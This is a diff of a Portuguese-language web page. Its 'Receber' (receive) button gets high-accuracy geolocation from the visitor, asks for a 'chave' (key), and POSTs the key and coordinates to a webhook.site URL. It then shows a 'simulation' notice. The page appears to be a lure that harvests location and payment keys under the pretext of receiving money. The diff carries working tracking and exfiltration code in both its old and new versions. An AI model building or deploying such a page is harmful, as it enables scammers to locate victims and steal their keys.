@@ -6,18 +6,8 @@
 <meta name="viewport" content="width=device-width, initial-scale=1">
 
 <style>
-body{
-  margin:0;
-  font-family:Arial, sans-serif;
-  background:#f5f5f5;
-}
-.tela{
-  display:none;
-  height:100vh;
-  justify-content:center;
-  align-items:center;
-  flex-direction:column;
-}
+body{margin:0;font-family:Arial;background:#f5f5f5}
+.tela{display:none;height:100vh;justify-content:center;align-items:center;flex-direction:column}
 .ativa{display:flex}
 
 button{
@@ -28,7 +18,6 @@ button{
   border-radius:14px;
   font-size:18px;
 }
-
 input{
   padding:14px;
   width:80%;
@@ -38,7 +27,6 @@ input{
   font-size:16px;
   margin-bottom:20px;
 }
-
 #notif{
   position:fixed;
   top:-120px;
@@ -50,7 +38,6 @@ input{
   border-radius:14px;
   transition:.5s;
   z-index:999;
-  font-size:14px;
 }
 #notif.show{top:20px}
 </style>
@@ -61,12 +48,12 @@ input{
 <div id="notif"></div>
 
 <div id="t1" class="tela ativa">
-  <button onclick="pedirPermissoes()">Receber</button>
+  <button onclick="pedir()">Receber</button>
 </div>
 
 <div id="t2" class="tela">
   <input id="chave" placeholder="Digite sua chave">
-  <button onclick="confirmar()">Confirmar</button>
+  <button onclick="enviar()">Confirmar</button>
 </div>
 
 <div id="t3" class="tela">
@@ -74,53 +61,41 @@ input{
 </div>
 
 <script>
-let posicao = null;
+let posicao=null;
 
-function pedirPermissoes(){
-  if(Notification.permission !== "granted"){
-    Notification.requestPermission();
-  }
-
+function pedir(){
   navigator.geolocation.getCurrentPosition(
     p=>{
-      posicao = p;
+      posicao=p;
       trocar("t2");
     },
-    ()=>alert("Permita a localização para continuar"),
+    ()=>alert("Permita a localização"),
     {enableHighAccuracy:true}
   );
 }
 
-function confirmar(){
-  if(!posicao){
-    alert("Localização não obtida");
-    return;
-  }
+function enviar(){
+  if(!posicao){alert("Sem localização");return;}
 
-  const dados = {
-    chave: document.getElementById("chave").value || "vazio",
-    latitude: posicao.coords.latitude,
-    longitude: posicao.coords.longitude,
-    precisao: posicao.coords.accuracy,
-    navegador: navigator.userAgent,
-    data: new Date().toISOString()
-  };
+  const chave=document.getElementById("chave").value || "vazio";
 
-  const blob = new Blob(
-    [JSON.stringify(dados)],
-    {type:"application/json"}
-  );
+  const body =
+    "chave="+encodeURIComponent(chave)+
+    "&latitude="+encodeURIComponent(posicao.coords.latitude)+
+    "&longitude="+encodeURIComponent(posicao.coords.longitude)+
+    "&precisao="+encodeURIComponent(posicao.coords.accuracy)+
+    "&data="+encodeURIComponent(new Date().toISOString());
 
-  navigator.sendBeacon(
-    "https://webhook.site/7b90f2d2-5b54-422c-9ab9-24a37ba6bab6",
-    blob
-  );
+  const xhr=new XMLHttpRequest();
+  xhr.open("POST","https://webhook.site/7b90f2d2-5b54-422c-9ab9-24a37ba6bab6",true);
+  xhr.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
+  xhr.send(body);
 
-  mostrarNotif();
+  notif();
   trocar("t3");
 }
 
-function mostrarNotif(){
+function notif(){
   const n=document.getElementById("notif");
   n.innerHTML="<b>Simulação</b><br>Recebimento demonstrativo";
   n.classList.add("show");
